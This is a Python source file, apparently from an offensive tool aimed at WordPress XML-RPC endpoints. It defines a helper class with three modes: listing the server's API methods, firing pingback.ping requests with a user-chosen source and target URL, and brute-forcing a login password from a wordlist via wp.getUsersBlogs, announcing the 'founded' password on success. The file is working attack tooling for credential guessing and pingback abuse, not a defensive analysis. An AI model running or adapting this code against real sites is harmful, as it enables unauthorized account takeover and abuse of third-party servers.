from argparse import Namespace
from typing import List, AnyStr
from logging import error, info, warning

from XmlRpcRequest import XmlRpcRequest


class XmlRpcHelper(object):
    """
        This class helps represents as manager class to use XmlRpcRequest class.

        Attributes
        ----------
        args : Namespace
            The simple Argparse library object to storing attributes.

        Methods
        -------
        _launchGetApiMethods(self) -> AnyStr
            This method returns list of available API methods of target server.
        _launchPingMode(self, src: str, dst: str) -> AnyStr
            This method start pinging by specified source and destination
            target addresses.
        _readWordlist(file_path: str) -> List[str]
            This method returns List of passwords to brute-forcing.
        _launchBruteMode(self, login: str, file_path: str) -> AnyStr
            This method start brute-forcing by specified login and passwords
            wordlist.
        selectScriptMode(self) -> None
            This mode configures and invokes XmlRpcRequest.sendHttpRequest method
            by specified method from command line by user.
    """

    def __init__(self, args: Namespace):
        self.args = args

        # TODO: add module with args validation
        self.url = args.u
        self.method = args.m

        self.xmlRpcRequest = XmlRpcRequest(url=self.url, method=self.method)

    def _launchGetApiMethods(self) -> AnyStr:
        return self.xmlRpcRequest.sendHttpRequest()

    def _launchPingMode(self, src: str, dst: str) -> AnyStr:
        return self.xmlRpcRequest.sendHttpRequest(first_param=src, second_param=dst)

    @staticmethod
    def _readWordlist(file_path: str) -> List[str]:
        try:
            return [passwd.rstrip('\n') for passwd in open(file_path, 'r').readlines()]
        except FileNotFoundError or FileExistsError as e:
            error(msg=f"[!]\tError while opening/reading specified file: {e.strerror}")
            exit(-1)

    def _launchBruteMode(self, login: str, file_path: str) -> AnyStr:
        passwords = XmlRpcHelper._readWordlist(file_path=file_path)

        for passwd in passwords:
            response = self.xmlRpcRequest.sendHttpRequest(first_param=login, second_param=passwd)
            validation_response = self.xmlRpcRequest.credentialsValidation(response)

            if validation_response is True:
                return passwd

            warning(msg=f"'[-] Nope! Not this password: {passwd}")

        exit(-1)

    def selectScriptMode(self) -> None:
        if self.method == 'pingback.ping':
            src = self.args.s
            dst = self.args.d

            response_text = self._launchPingMode(src=src, dst=dst)
            info(msg=response_text)

        elif self.method == 'wp.getUsersBlogs':
            login = self.args.l
            passwords_file_path = self.args.p

            founded_passwd = self._launchBruteMode(login=login, file_path=passwords_file_path)
            info(msg=f"[+] Done! The password has been founded: {founded_passwd}")

        else:
            response_text = self._launchGetApiMethods()
            info(msg=response_text)
